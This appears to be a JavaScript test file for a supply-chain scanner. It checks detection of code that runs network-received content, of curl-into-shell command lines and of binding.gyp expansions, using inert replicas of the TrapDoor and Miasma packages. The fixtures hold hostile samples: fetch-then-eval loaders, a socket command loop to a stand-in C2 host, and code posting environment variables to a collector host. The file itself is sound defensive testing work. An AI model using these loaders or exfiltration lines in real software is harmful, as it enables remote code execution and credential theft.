// Code that runs what it receives over the network (lib/received.js, twin of
// core.runs_received_code), a download substituted into a command line
// (lib/shellpipe.js), and binding.gyp command expansions that run a file of
// the package (lib/supplychain.js scanGyp, src/deps.js). The replica tests
// of TrapDoor (import-time code downloading code into `node -e`) and Miasma
// v2 (a binding.gyp expansion running the payload, no install script) were
// no finding and a MAJOR; python/tests/scanner/test_review_received_code.py
// and test_review_gyp_expansions.py have the full cases, and
// tests/architecture/test_js_parity_hooks.py / test_js_parity_gyp.py compare
// the engines. Everything is inert text: hosts are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run, runsReceivedCode, runsSubstitutedDownload, importTimeRisk, installScriptRisk, scanGyp } from "../src/index.js";

const U = "'https://files.invalid/p'";
const REASON = "runs code it receives over the network";
const TRAPDOOR = "import subprocess, urllib.request\ncode = urllib.request.urlopen(" + U + ").read().decode()\n" +
  "subprocess.run(['node', '-e', code])\n";

const RECEIVED = [
  [TRAPDOOR, 3],
  ["import requests\nexec(requests.get(" + U + ").text)\n", 2],
  ["import urllib.request\nwith urllib.request.urlopen(" + U + ") as resp:\n    code = resp.read().decode()\nexec(code)\n", 4],
  ["import requests\n\ndef get_payload():\n    r = requests.get(" + U + ")\n    return r.text\n\nexec(get_payload())\n", 7],
  ["import os, requests\nsrc = requests.get(" + U + ").text\nos.system(f'python3 -c \"{src}\"')\n", 3],
  ["import socket, subprocess\ns = socket.create_connection(('c2.invalid', 4444))\nwhile True:\n" +
   "    cmd = s.recv(1024).decode()\n    subprocess.run(cmd, shell=True)\n", 5],
  ["const https = require('https');\nhttps.get(" + U + ", (res) => {\n  let body = '';\n" +
   "  res.on('data', (c) => { body += c; });\n  res.on('end', () => { eval(body); });\n});\n", 5],
  ["fetch(" + U + ")\n  .then((r) => r.text())\n  .then((code) => eval(code));\n", 3],
  ["const { spawn } = require('child_process');\nfetch(" + U + ").then((r) => r.text()).then((code) => {\n" +
   "  spawn(process.execPath, ['-e', code], { detached: true }).unref();\n});\n", 3],
  ["const load = (u) => fetch(u).then((r) => r.text());\n" + "// …\n".repeat(80) + "load(" + U + ").then((c) => eval(c));\n", 82],
  ["(async () => {\n  const code = await (await fetch(" + U + ")).text();\n  execSync(`node -e ${JSON.stringify(code)}`);\n})();\n", 3],
  ["var x = new XMLHttpRequest();\nx.open('GET', " + U + ", false);\nx.send();\neval(x.responseText);\n", 4],
  ["x".repeat(2000) + ";eval(await(await fetch(" + U + ")).text());" + "y".repeat(2000), 1],
  ["\u{1d41a}".repeat(1200) + ";spawn('node', ['-e', await (await fetch(u)).text()]);", 1],
  // quotes read as a language pairs them: a regex literal's quote does not hide a call or a binding
  ["if (/'/.test(v)) { new Function('a', await (await fetch(" + U + ")).text())(); }\n", 1],
  ["const q = /'/; const code = await (await fetch(" + U + ")).text(); const r = /'/;\neval(code);\n", 2],
  ["require('https').get(" + U + ", (res) => { let b = ''; res.on('data', (c) => { b += c; }); " +
   "res.on('end', () => eval(b)); });\n", 1],
  ["const code = await (await fetch(" + U + ")).text();\neval(" + " ".repeat(600) + "code);\n", 2],
];
const NOT_RECEIVED = [
  "const r = await fetch(u);\nconst body = await r.text();\nconst m = /v(\\d+)/.exec(body);\n",
  "const r = await fetch(u);\nconst latest = (await r.json()).version;\nexecSync(`npm i -g pkg@${latest}`);\n",
  "var xhr = new XMLHttpRequest();\nxhr.onload = function () { var o = eval('(' + xhr.responseText + ')'); };\n",
  "import subprocess, requests\nurl = requests.get(api).json()['clone_url']\nsubprocess.run(['git', 'clone', url])\n",
  "from requests import get\ncmd = os.environ.get('CMD')\nos.system(cmd)\n",
  "module.exports = require('https');\n\nmodule.exports.run = function (code) {\n  return eval(code);\n};\n",
  "const r = await fetch(u);\nclass Runner {\n  exec(r) {\n    return r;\n  }\n}\n",
  "import requests\nbody = requests.get(u).text\n" + "x = 1\n".repeat(60) + "exec(body)\n",
  "const r = await fetch(u);\nconst script = 'console.log(1)';\nexecSync(`node -e ${script}`);\n",
  "import subprocess, requests\ncmd = requests.get(u).text\nsubprocess.run(cmd.split())\nsubprocess.run(['ls'], shell=True)\n",
  "import subprocess, requests\ncmd = requests.get(u).text\nsubprocess.run(cmd, " + "x=1, ".repeat(100) + "shell=True)\n",
];

test("received code is found on its line, in both tests", () => {
  for (const [text, line] of RECEIVED) {
    assert.equal(runsReceivedCode(text), line, text.slice(0, 80));
    const [reasons, at] = importTimeRisk(text);
    assert.ok(reasons.includes(REASON));
    assert.equal(at, line);
    assert.ok(installScriptRisk(text).includes(REASON));
  }
  for (const text of NOT_RECEIVED) {
    assert.equal(runsReceivedCode(text), null, text.slice(0, 80));
    assert.ok(!importTimeRisk(text)[0].includes(REASON));
  }
});

test("texts built to make the follower work cost about one pass", () => {
  // about 200 KB each (python/tests/scanner/test_review_received_code.py has the same)
  const shapes = [
    "const code = await (await fetch(u)).text(); new Function(x)(); eval('y');\n".repeat(2700),
    ("fetch(u);" + "eval(".repeat(198) + "\n").repeat(200),
    ("x=fetch(u);eval(" + "a,".repeat(490) + "a)\n").repeat(200),
    ("fetch(u).then(" + "x=>x,".repeat(160) + "x=>x)\n").repeat(200) + "eval(zz)\n",
    ("a=fetch(u);" + "b=a;".repeat(245) + "\n").repeat(200) + "eval(zz)\n",
    Array.from({ length: 6000 }, (_, i) => `const fn${i} = (u) => fetch(u);\n`).join("") + "eval(zz)\n",
    ("fetch(u);" + "'eval(".repeat(165) + "\n").repeat(200),
    ("fetch(u);function" + " ".repeat(980) + "\nfor" + " ".repeat(990) + "\n").repeat(100) + "eval(zz)\n",
    ("eval(" + "x".repeat(400) + "fetch(u)" + ");").repeat(500),
    "shell=True\n" + ("run(".repeat(100) + "fetch(u);").repeat(500),
  ];
  const start = Date.now();
  for (const text of shapes) assert.equal(runsReceivedCode(text), null);
  assert.ok(Date.now() - start < 30000);
});

test("a download substituted into a shell's or an interpreter's command line", () => {
  for (const row of ["bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"", "node -e \"$(curl -s https://files.invalid/p.js)\"",
    "eval \"$(wget -qO- https://files.invalid/i.sh)\"", "source <(curl -s https://files.invalid/e.sh)"]) {
    assert.ok(runsSubstitutedDownload(row), row);
    assert.deepEqual(installScriptRisk(`#!/bin/sh\n${row}\n`), [REASON]);
  }
  for (const row of ["echo \"$(curl -s https://files.invalid/v)\"", "V=$(curl -s https://files.invalid/v)",
    "diff <(curl -s https://files.invalid/a) b"]) assert.ok(!runsSubstitutedDownload(row), row);
  const exec = "require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n";
  assert.deepEqual(importTimeRisk(exec), [["runs a downloaded script through a shell"], 1]);
});

test("binding.gyp expansions that run a file of the package", () => {
  const found = (v) => scanGyp("node_modules/p/binding.gyp", `{'variables': {'v': ${v}}}`).map((i) => [i.sev, i.cmd]);
  assert.deepEqual(found("'<!(node index.js > /dev/null 2>&1 && echo stub.c)'"),
    [["INFO", "node index.js > /dev/null 2>&1 && echo stub.c"]]);
  assert.deepEqual(found("'^!(node ./gen.js)'"), [["INFO", "node ./gen.js"]]);
  assert.deepEqual(found("'<!([\"node\", \"tools/a b.js\"])'"), [["INFO", "node 'tools/a b.js'"]]);
  assert.deepEqual(found("'<!pymod_do_main(helper_mod arg)'"), [["INFO", "python -m helper_mod arg"]]);
  assert.deepEqual(found("'<!(node <(module_root_dir)/tools/gen.js)'"), [["INFO", "node ./tools/gen.js"]]);
  for (const v of ["'<!(node -p \"require(\\'node-addon-api\\').include\")'", "'<!(pkg-config --cflags glib-2.0)'",
    "'<!(node -p \"require(\\'./package.json\\').version\")'", "'<!(node <(node_root_dir)/x.js)'"]) {
    assert.deepEqual(found(v), [], v);
  }
  assert.deepEqual(found("'<!(curl -s http://192.0.2.1/x)'"), [["CRITICAL", "curl -s http://192.0.2.1/x"]]);
});

test("--deps: the Miasma and TrapDoor replicas", () => {
  const files = {
    "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
    "node_modules/miasma/package.json": JSON.stringify({ name: "miasma", version: "1.0.0", main: "index.js" }),
    "node_modules/miasma/binding.gyp": "{'targets': [{'target_name': 'stub', 'sources': " +
      "['<!(node index.js > /dev/null 2>&1 && echo stub.c)']}]}\n",
    "node_modules/miasma/index.js": "const data = JSON.stringify(process.env);\n" +
      "fetch('https://collector.invalid/collect', { method: 'POST', body: data });\n",
    "venv/pyvenv.cfg": "home = /usr\n",
    "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py": TRAPDOOR,
  };
  const root = mkdtempSync(join(tmpdir(), "lz-received-"));
  const out = mkdtempSync(join(tmpdir(), "lz-received-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, data);
    }
    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    const got = rep.issues.filter((i) => i.rule.startsWith("SC-")).map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.sev, i.msg]);
    const env = "reads environment variables or credential files and sends data over the network";
    assert.deepEqual(got.sort(), [
      ["SC-IMPORT-RISK", "venv/lib/python3.12/site-packages/trapdoor_py/__init__.py", "MAJOR", `Dependency code ${REASON}.`],
      ["SC-INSTALL-HOOK", "node_modules/miasma/binding.gyp", "CRITICAL", `Install hook runs index.js, which ${env}.`],
      ["SC-INSTALL-HOOK", "node_modules/miasma/binding.gyp", "MAJOR",
        "\"install (implicit)\" script runs code at install time: 'node-gyp rebuild'."],
    ]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
});
